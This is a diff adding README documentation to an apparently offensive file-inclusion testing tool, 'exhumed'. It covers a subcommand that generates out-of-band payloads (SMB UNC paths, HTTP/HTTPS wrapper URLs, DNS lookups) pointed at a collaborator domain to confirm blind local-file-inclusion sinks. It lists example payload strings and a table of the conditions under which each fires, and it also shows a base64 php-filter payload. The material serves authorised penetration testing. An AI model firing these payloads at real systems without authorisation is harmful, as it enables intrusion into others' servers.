@@ -203,6 +203,54 @@ the target before arming it:
 exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug
 ```
 
+### Out-of-band confirmation for blind LFI
+
+`exhumed`'s detection is response-body pattern matching, so it cannot see a
+**blind** sink — one that reads or `include()`s a file but never reflects its
+contents in the HTTP response. `exhumed payload oob` generates out-of-band
+payloads that force the target to make an outbound interaction (DNS, SMB, or
+HTTP) to a collaborator domain you control. Observing that interaction at your
+collaborator (interactsh, Burp Collaborator, a controlled DNS/HTTP log) proves
+the sink fired even with an empty response.
+
+Like the other `payload` subcommands, this is a **generator**: it prints the
+strings and performs no network I/O — it runs no listener. You place each string
+into the vulnerable parameter and correlate hits at your collaborator yourself.
+
+```bash
+exhumed payload oob --domain abc123.oast.fun
+```
+
+```
+smb-unc        \\abc123.oast.fun\exhumed
+http-wrapper   http://abc123.oast.fun/exhumed-oob
+https-wrapper  https://abc123.oast.fun/exhumed-oob
+dns-resolve    \\abc123.oast.fun\
+```
+
+Four techniques are emitted, most to least reliable:
+
+| Technique | Payload shape | Fires when |
+|-----------|---------------|-----------|
+| `smb-unc` | `\\<domain>\<share>` | Windows `include()` / Java / .NET file APIs dereference UNC paths (SMB + DNS) |
+| `http-wrapper` | `http://<domain>/...` | `allow_url_include` is on or the sink fetches URLs |
+| `https-wrapper` | `https://<domain>/...` | egress only permits TLS fetches |
+| `dns-resolve` | `\\<domain>\` | DNS lookup only — survives strict egress that blocks SMB/HTTP |
+
+Pass `--label` to prepend a per-technique subdomain (`http.<domain>`,
+`dns.<domain>`, …) so an observed interaction can be attributed to the technique
+that triggered it, and `--json` for machine-readable output (value, technique,
+subdomain, and a note describing each payload's precondition). `--share` and
+`--path` customise the SMB share and the http(s) resource path.
+
+```bash
+exhumed payload oob --domain x.burpcollaborator.net --label --json
+```
+
+> Automated listener and hit-correlation (e.g. an interactsh-client mode) is a
+> planned follow-on; today exhumed generates the payloads and you confirm
+> out-of-band.
+
 ### Other commands
 
 ```bash
